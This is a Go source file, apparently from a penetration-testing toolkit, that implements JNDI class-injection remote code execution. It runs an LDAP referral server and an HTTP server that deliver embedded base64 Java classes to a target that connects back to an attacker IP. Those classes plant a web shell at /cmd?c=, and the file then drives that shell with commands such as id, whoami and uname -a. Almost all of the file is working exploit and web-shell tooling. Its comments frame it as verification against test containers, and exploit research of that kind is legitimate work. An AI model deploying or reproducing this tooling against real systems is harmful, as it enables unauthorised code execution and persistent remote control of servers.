package rceverify

import (
	"encoding/base64"
	"fmt"
	"io"
	"io/fs"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// Server holds the state for a JNDI class-injection RCE verification session.
type Server struct {
	LDDebugAddr string // IP the target should connect back to (Kali IP)
	HTTPPort    int    // serves .class files
	LDAPPort    int    // minimal LDAP referral server
	LDAPPath    string // e.g. "ixpnv5"

	// JavaNative 为 true 时额外提供 JavaCmd/JavaStager，CmdFilter 会优先走
	// 纯 Java 命令解释（不创建进程）；false 时退回 Runtime/ProcessBuilder。
	JavaNative bool

	httpSrv  *http.Server
	ldapLis  net.Listener
	classMap map[string][]byte
	stopCh   chan struct{}
}

// New creates a verification server. externalIP is the address the *target* container
// should connect back to (Kali IP or host.docker.internal).
func New(externalIP string, httpPort, ldapPort int) *Server {
	return &Server{
		LDDebugAddr: externalIP,
		HTTPPort:    httpPort,
		LDAPPort:    ldapPort,
		LDAPPath:    "ixpnv5",
		JavaNative:  true,
		classMap:    map[string][]byte{},
		stopCh:      make(chan struct{}),
	}
}

// Start decodes embedded classes, starts HTTP + LDAP listeners.
func (s *Server) Start() error {
	etj8, _ := base64.StdEncoding.DecodeString(etj8B64)
	etj81, _ := base64.StdEncoding.DecodeString(etj81B64)
	cmd, _ := base64.StdEncoding.DecodeString(cmdB64)
	filter, _ := base64.StdEncoding.DecodeString(filterB64)
	s.classMap["ExecTemplateJDK8.class"] = etj8
	s.classMap["ExecTemplateJDK8$CmdHandler.class"] = etj81
	s.classMap["CmdServlet.class"] = cmd
	s.classMap["CmdFilter.class"] = filter

	if s.JavaNative {
		entries, err := fs.ReadDir(javaNativeFS, "java/classes")
		if err != nil {
			return fmt.Errorf("read java-native classes: %w", err)
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			b, err := javaNativeFS.ReadFile("java/classes/" + e.Name())
			if err != nil {
				return fmt.Errorf("read %s: %w", e.Name(), err)
			}
			s.classMap[e.Name()] = b
		}
		log.Printf("[jndi] java-native payload: %d classes (JavaCmd/JavaStager/CmdFilter)", len(entries))
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		name := strings.TrimPrefix(r.URL.Path, "/")
		if data, ok := s.classMap[name]; ok {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write(data)
			log.Printf("[http] served %s (%d bytes)", name, len(data))
			return
		}
		http.NotFound(w, r)
	})
	s.httpSrv = &http.Server{Addr: fmt.Sprintf("0.0.0.0:%d", s.HTTPPort), Handler: mux}
	go func() {
		if err := s.httpSrv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[http] error: %v", err)
		}
	}()

	lis, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", s.LDAPPort))
	if err != nil {
		return fmt.Errorf("ldap listen: %w", err)
	}
	s.ldapLis = lis
	go s.serveLDAP()
	log.Printf("[jndi] http=:%d ldap=:%d path=/%s", s.HTTPPort, s.LDAPPort, s.LDAPPath)
	return nil
}

// LDAPURL returns the LDAP lookup string for payloads.
func (s *Server) LDAPURL() string {
	return fmt.Sprintf("ldap://%s:%d/%s", s.LDDebugAddr, s.LDAPPort, s.LDAPPath)
}

func (s *Server) httpClassURL() string {
	return fmt.Sprintf("http://%s:%d/ExecTemplateJDK8.class", s.LDDebugAddr, s.HTTPPort)
}

// Stop shuts down listeners.
func (s *Server) Stop() {
	close(s.stopCh)
	s.ldapLis.Close()
	s.httpSrv.Close()
}

// VerifyCmd sends a command via /cmd?c= and returns the response body.
// Polls up to timeout for the filter/servlet to become available.
func (s *Server) VerifyCmd(targetBase, cmd string, timeout time.Duration) (string, error) {
	deadline := time.Now().Add(timeout)
	url := fmt.Sprintf("%s/cmd?c=%s", strings.TrimRight(targetBase, "/"), url.QueryEscape(cmd))
	for time.Now().Before(deadline) {
		resp, err := http.Get(url)
		if err == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			resp.Body.Close()
			// 200 with body = servlet works
			if resp.StatusCode == 200 && len(body) > 0 {
				return string(body), nil
			}
			// 302 = Shiro filter intercepts, fallback to internal 9999
			if resp.StatusCode == 302 {
				return "", fmt.Errorf("302 redirect (filter intercepted)")
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
	return "", fmt.Errorf("timeout waiting for /cmd?c=%s", cmd)
}

// VerifyCmdInternal tries the fallback HTTP server on port 9999 inside the container.
// This is used when Shiro/other filters block /cmd on the main port.
// containerExecFunc should run a command inside the target container (e.g. docker exec).
func (s *Server) VerifyCmdInternal(cmd string, timeout time.Duration, containerExec func(string) (string, error)) (string, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		result, err := containerExec(fmt.Sprintf("curl -s http://127.0.0.1:9999/cmd?c=%s", cmd))
		if err == nil && strings.TrimSpace(result) != "" {
			return strings.TrimSpace(result), nil
		}
		time.Sleep(500 * time.Millisecond)
	}
	return "", fmt.Errorf("timeout waiting for internal :9999/cmd?c=%s", cmd)
}

// RunAll executes the canonical blind-test commands and returns their outputs.
func (s *Server) RunAll(targetBase string) map[string]string {
	out := map[string]string{}
	for _, c := range []string{"id", "whoami", "pwd", "cat /etc/hostname", "uname -a"} {
		r, err := s.VerifyCmd(targetBase, c, 5*time.Second)
		if err != nil {
			out[c] = fmt.Sprintf("ERR: %v", err)
		} else {
			out[c] = strings.TrimSpace(r)
		}
	}
	return out
}
